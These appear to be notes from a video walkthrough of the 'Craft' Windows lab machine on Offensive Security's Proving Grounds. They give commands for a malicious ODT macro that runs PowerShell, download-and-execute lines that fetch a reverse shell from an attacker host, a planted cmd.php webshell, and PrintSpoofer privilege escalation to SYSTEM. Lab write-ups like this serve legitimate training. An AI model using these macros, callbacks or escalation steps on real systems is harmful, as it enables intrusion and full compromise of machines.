The following are comprehensive notes, commands, and lessons derived from the **"Craft Walkthrough with S1REN"** video, which focuses on exploiting a Windows machine on Offensive Security's Proving Grounds.

The walkthrough demonstrates a full penetration test lifecycle: **Enumeration, Initial Access (Macro Execution), Lateral Movement, and Privilege Escalation (PrintSpoofer).**

***

## 1. Initial Enumeration and Setup

The process begins with basic reconnaissance and target setup in the terminal.

### **Environment Setup**
* The target IP is saved as an environment variable for easy use in commands:
    * `export IP=<Target IP>`
    * `echo $IP`

### **Port Scanning (Nmap)**
A full port scan is performed to identify open services and versions.

| Command | Description | Timestamp |
| :--- | :--- | :--- |
| `nmap -p- -sC -sV --open $IP` | **-p-**: Scan all 65,535 ports. **-sC**: Run simple scripts. **-sV**: Probe open ports to determine service/version info. **--open**: Only show ports marked as `open`. | [[01:21](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=81)] |
| **Result** | Only **Port 80 (HTTP)** is found to be open, running **Apache 2.4.48** and **PHP 8.0.6**. | [[02:26](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=146)] |

***

## 2. Initial Access: Exploiting ODT Macro Execution

The web service on Port 80 contains a "Submit your resume" form that enforces an **ODT file type** requirement. The vulnerability is the execution of malicious LibreOffice Basic macros embedded within an ODT document when opened by a user.

### **Macro Payload (Test Connectivity)**
A macro is created in **LibreOffice Writer** to test if a document is opened by triggering a simple network request back to the attacker's machine.

| Component | Detail | Timestamp |
| :--- | :--- | :--- |
| **Tool** | **LibreOffice Writer** (install using `apt install libreoffice-writer`) | [[06:30](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=390)] |
| **Macro Code** | The code uses the `Shell` function in LibreOffice Basic to execute a system command: `Shell("cmd.exe /c powershell iwr http://<Attacker IP>:80")`| [[08:53](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=533)] |
| **Attachment** | The macro must be attached to the **"Open document"** event under **Tools > Customize > Events**. | [[10:07](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=607)] |
| **Attacker Listener** | A simple HTTP server is set up to receive the connection proof: `python3 -m http.server 80` (or `python -m simplehttpserver 80`) | [[12:17](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=737)] |
| **Proof of Concept** | After uploading the ODT file and a user opens it, a `GET /` request is received on the attacker's listener, confirming execution. | [[12:47](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=767)] |

***

## 3. Gaining a Shell (Lateral Movement)

The next step is to modify the macro to download and execute a full reverse shell payload, moving from the HR user context to the **Apache user** context via the web application.

### **Reverse Shell Payload (offsec.ps1)**
A PowerShell reverse shell payload is obtained (e.g., from a GitHub repository) and saved as `offsec.ps1`. The attacker's IP and listening port (`9090`) are configured in the file.

### **Final Macro Command**
The macro is updated to perform two chained PowerShell commands:
1.  **Download:** Use `iwr` (Invoke-WebRequest) to download the shell script.
2.  **Execute:** Execute the downloaded script.

| Macro Command (Chained) | Description | Timestamp |
| :--- | :--- | :--- |
| `cmd.exe /c powershell iwr http://<Attacker IP>:80/offsec.ps1 -o C:\Windows\Tasks\offsec.ps1` | Downloads the PowerShell reverse shell payload to a writable location on the target machine. | [[18:17](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1097)] |
| `cmd.exe /c powershell -c C:\Windows\Tasks\offsec.ps1` | Executes the downloaded script. | [[18:59](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1139)] |

### **Execution and Post-Exploitation**

| Command | Result/Lesson | Timestamp |
| :--- | :--- | :--- |
| `nc -lvnp 9090` | Netcat listener is set up to catch the shell. | [[17:43](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1063)] |
| `whoami` | The initial shell is obtained as **`craft\the_cyber_geek`** (an unprivileged user). | [[23:54](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1434)] |
| **Lateral Movement** | **A webshell (`cmd.php`) is uploaded to the web root (`C:\xampp\htdocs`) using the same PowerShell file transfer technique.** This allows commands to be executed directly as the **`craft\Apache`** user via the browser, which simplifies further file transfers. | [[29:10](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1750)] |
| `whoami /all` | Checking privileges of the **`craft\Apache`** user reveals the key to privilege escalation: **`SeImpersonatePrivilege` is enabled**. | [[32:21](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=1941)] |

***

## 4. Privilege Escalation: NT AUTHORITY\SYSTEM

The presence of the **`SeImpersonatePrivilege`** on the Apache service user allows for vertical privilege escalation to **`NT AUTHORITY\SYSTEM`** using tools like PrintSpoofer.

### **Privilege Escalation Tool**
* **Tool:** **PrintSpoofer** (used to abuse the impersonation token privilege).

### **Execution using the Webshell (cmd.php)**
The webshell is used to first transfer the PrintSpoofer binary and then execute it, chaining the execution with the reverse shell payload.

1.  **Download PrintSpoofer:**
    * The `printspoofer64.exe` binary is transferred to the target's `C:\Windows\Tasks\` directory using the `cmd.php` webshell (via `iwr` PowerShell command). | [[36:01](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=2161)] |
    * **Attacker Listener:** `python3 -m http.server 80` (hosting the binary)

2.  **Execute PrintSpoofer for System Shell:**
    * The `printspoofer64.exe` is executed via the webshell, commanding it to execute the original reverse shell payload (`offsec.ps1`).

| Command (URL Encoded) | Description | Timestamp |
| :--- | :--- | :--- |
| `C:\Windows\Tasks\printspoofer64.exe -c "cmd.exe /c powershell -c C:\Windows\Tasks\offsec.ps1"` | The command tells PrintSpoofer to execute a new command (`powershell offsec.ps1`) under the context of an impersonated token (NT Authority\System). | [[39:07](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=2347)] |
| **Final Result** | A new netcat listener receives the shell as **`NT AUTHORITY\SYSTEM`**, achieving full compromise. | [[40:54](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=2454)] |

### **Flag Retrieval**
* With System privileges, the final proof file can be accessed from the Administrator's desktop:
    * `cd C:\Users\Administrator\Desktop`
    * `type proof.txt` | [[41:31](http://www.youtube.com/watch?v=0Am8mzOXTVk&t=2491)]

***
Video Source: [Craft Walkthrough with S1REN](http://www.youtube.com/watch?v=0Am8mzOXTVk)
***

http://googleusercontent.com/youtube_content/0